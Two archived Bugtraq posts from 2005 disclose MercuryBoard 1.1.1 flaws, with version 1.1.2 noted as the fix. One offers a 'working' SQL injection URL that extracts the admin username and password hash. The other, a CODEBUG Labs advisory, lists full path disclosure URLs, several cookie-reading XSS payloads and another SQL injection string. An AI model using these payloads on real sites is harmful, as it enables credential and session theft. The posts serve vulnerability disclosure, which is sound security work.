=== Content from marc.info_3a37c971_20250125_130937.html ===

```
[[prev in list](?l=bugtraq&m=110798803421506&w=2)] [[next in list](?l=bugtraq&m=110796956011699&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Mercuryboard =?iso-8859-1?Q?<=3D?= 1.1.1 Working Sql Injection
From:       ["Zeelock" <zee () psybnc ! it>](?a=110797512000003&r=1&w=2)
Date:       [2005-02-09 9:25:44](?l=bugtraq&r=1&w=2&b=200502)
Message-ID: [20050209092544.5905.qmail () webmail2 ! aruba ! it](?i=20050209092544.5905.qmail%20()%20webmail2%20!%20aruba%20!%20it)
[Download RAW [message](?l=bugtraq&m=110797495532358&q=mbox) or [body](?l=bugtraq&m=110797495532358&q=raw)]

This is a MIME-formatted message.  If you see this text it means that your
mail software cannot handle MIME-formatted messages.

I made this just because the provided proof of concept by Andrea Trivero
didn't work.

Zk

[["zk-mercuryboard.txt" (zk-mercuryboard.txt)]](?l=bugtraq&m=110797495532358&q=p3)

{==============================================================================}
{                           [   Zeelock-2005   ]                               }
{==============================================================================}
{                                                                              }
{                          M E C U R Y  B O A R D                              }
{                                                                              }
{             [   Critical SQL Injection - Working Exploit  ]                  }
{                                                                              }
{                                                                              }
{==============================================================================}

Date: 7th February 2005
Version Vulnerable: <= 1.1.1
Version Fixed: 1.1.2

"Validate anything can be passed. Security lays in the inputs. " - zk

Description
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
MercuryBoard is a powerful message board system dedicated to raw speed with a
mixture of features, ease of use, and ease of customization coupled with
expandability, and diverse language services. Now just over two years in the
making, version 1.0.0 is an immensely stable, thoroughly tested, and well
written piece of internet software ready for any webserver, running on PHP
versions as low as 4.0.0 and MySQL versions as low as 3.22.

For More information:

<http://www.mercuryboard.com/index.php?a=about>

Vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Andrea Trivero of Codebug Security ([www.codebug.org](http://www.codebug.org)) found a lot of security
flaws inside this code: many XSS and some Sql injection.
Anyway he did not provide a real working exploit.

Looking at the following piece of code in func/post.php we can see that when the
"qu" variable is passed along with the "reply" switch we can inject anything
inside the "t" parameter passed via GET from the browser because it is not
sanitized at all.

--------[ Mercury 1.1.1 original code ]--------------

if (($s == 'reply') && isset($this->get['qu'])) {

$query = $this->db->fetch("SELECT p.post_text, m.user_name FROM {

$this->pre}posts p, {$this->pre}users m WHERE p.post_id={

$this->get['qu']} AND p.post_author=m.user_id");

--------[/Mercury 1.1.1 original code ]--------------

Now we can try to inject something:

<http://www.site.com/mercuryboard/index.php?a=post&s=reply&t=1&qu=10000%20UNION>
%20SELECT%20null,null/*

The only thing we have to keep in mind is that "t" parameter should refer to a
"opic we have the permission to reply and the "qu" parameter should refer
to a non existing topic.

We get no errors so we can make something more.

Proof of concept
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

<http://www.site.com/mercuryboard/index.php?a=post&s=reply&t=1&qu=10000%20UNION>
%20SELECT%20user_password,user_name%20from%20mb_users%20where%20user_group%20
=%201%20limit%201/*

The nice thing is that you should see the Admin Username and the Admin Pwd Hash
inside the reply form between the [quote] tags.

Note: During the installation you may have chosen a different prefix for the
tables. You need to modify the query in the right way to retrieve the
information from the database.

[[prev in list](?l=bugtraq&m=110798803421506&w=2)] [[next in list](?l=bugtraq&m=110796956011699&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_845c746f_20250125_130936.html ===

```
[[prev in list](?l=bugtraq&m=110662656127690&w=2)] [[next in list](?l=bugtraq&m=110662561415169&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Multiple vulnerabilities in MercuryBoard 1.1.1
From:       ["Alberto Trivero" <trivero () jumpy ! it>](?a=110661797700003&r=1&w=2)
Date:       [2005-01-24 21:37:47](?l=bugtraq&r=1&w=2&b=200501)
Message-ID: [002101c5025c$f245e1c0$0201a8c0 () snackest](?i=002101c5025c$f245e1c0$0201a8c0%20()%20snackest)
[Download RAW [message](?l=bugtraq&m=110661795632354&q=mbox) or [body](?l=bugtraq&m=110661795632354&q=raw)]

*************************************************************
* CODEBUG Labs
* Advisory #7
* Title: Multiple vulnerabilities in MercuryBoard 1.1.1
* Author: Alberto Trivero
* English Version: Alberto Trivero
* Product: MercuryBoard 1.1.1
* Type: Multiple Vulnerabilities
* Web: <http://www.codebug.org/>
*************************************************************

--) Software Page ([www.mercuryboard.com](http://www.mercuryboard.com))

"MercuryBoard is a powerful message board system dedicated to raw speed with
a mixture of
features, ease of use, and ease of customization coupled with expandability,
and diverse
language services." Note that is write in PHP OOP.

--) Full Path Disclosure

Let's look at original code from global.php line 604:

<?
    ...
    // some base variables
    $current = ceil($min / $num);
    $string  = null;
    $pages   = ceil($rows / $num);
    $end     = ($pages - 1) * $num;
    ...
?>

As we can see there isn't a control to $num and so if we simply assign to
$num the value 0
(or a not numerical argument), there will be an impossible division by zero
that show the
full path:

    <http://www.sitewithmercuryboard.com/index.php?a=forum&f=2&min=0&n=0>

Other Full Path Disclosure:

    <http://www.sitewithmercuryboard.com/lib/jpgraph/jpgraph_bar.php>
    <http://www.sitewithmercuryboard.com/lib/jpgraph/jpgraph_log.php>
    <http://www.sitewithmercuryboard.com/lib/jpgraph/jpgraph_polar.php>
    <http://www.sitewithmercuryboard.com/admincp/admin.php>
    <http://www.sitewithmercuryboard.com/func/>[file] <--- All the PHP file in
the dyrectory:
                                             active.php board.php
constants.php cp.php
                                             debug.php email.php forum.php
help.php login.php
                                             members.php mod.php pm.php
post.php printer.php
                                             profile.php register.php
search.php topic.php

--) Cross-Site Scripting (XSS)

Let's look at original code from /func/pm.php line 36:

<?
    ...
    if (!isset($this->get['s'])) {
      $this->get['s'] = null;
    }
    switch($this->get['s'])
    {
    case 'send':
      return $this->send();
      break;
    case 'view':
      return $this->view();
      break;
    case 'delete':
      return $this->delete_pm();
      break;
    case 'clear':
      return $this->clear();
      break;
    default:
      return $this->folder();
      break;
    }
    ...
?>

As we can see there is a switch/case cycle to get 's' but in this cycle
there isn't any
check if we put other parameter with 's', like this XSS code:

<http://www.sitewithmercuryboard.com/index.php?a=pm&s=>'><script>alert(document.cookie)</script>

Let's look again at original code from /func/members.php line 35:

<?
    ...
    if (!isset($this->get['l'])) {
      $this->get['l'] = null;
    } else {
      $this->get['l'] = strtoupper($this->get['l']);
    }
    ...
?>

As we can see, also in this case, there isn't parsing methods for the
processing of 'l',
so nothing can prevent us from doing an XSS attack:

<http://www.sitewithmercuryboard.com/index.php?a=members&l=>'><script>alert(document.cookie)</script>

Other Cross-Site Scripting:

<http://www.sitewithmercuryboard.com/index.php?a=>'><script>alert(document.cookie)</script>

<http://www.sitewithmercuryboard.com/index.php?a=post&s=>'><script>alert(document.cookie)</script>

<http://www.sitewithmercuryboard.com/index.php?a=post&s=reply&t=>'><script>alert(document.cookie)</script>

<http://www.sitewithmercuryboard.com/index.php?a=pm&s=send&to=>'><script>alert(document.cookie)</script>

<http://www.sitewithmercuryboard.com/index.php?a=pm&s=send&to=2&re=>'><script>alert(document.cookie)</script>

<http://www.sitewithmercuryboard.com/index.php?a=cp&s=>'><script>alert(document.cookie)</script>

--) SQL Injection

For the same reason because it's possible to execute the XSS codes described
before, it's
also possible to do SQL Injection attacks. But in this case it's a
non-critical bug, why?
Because we need first login as forum administrator to make successful
attack. For example:

<http://www.sitewithmercuryboard.com/index.php?a=post&s=reply&t=0%20UNION%20SELECT%20user_id,%20user_password%20FROM%20mb_users%20/*>

With the URL before we get, for the just described reason, an error like
this (verified
only on MercuryBoard 1.1.0):

    The used SELECT statements have a different number of columns

--) Patch

After the report to developer of the board of these bugs, they released the
version 1.1.2
of MercuryBoard that correct them:
<http://www.mercuryboard.com/index.php?a=downloads>

*************************************************************
        <http://www.codebug.org>
*************************************************************

[[prev in list](?l=bugtraq&m=110662656127690&w=2)] [[next in list](?l=bugtraq&m=110662561415169&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


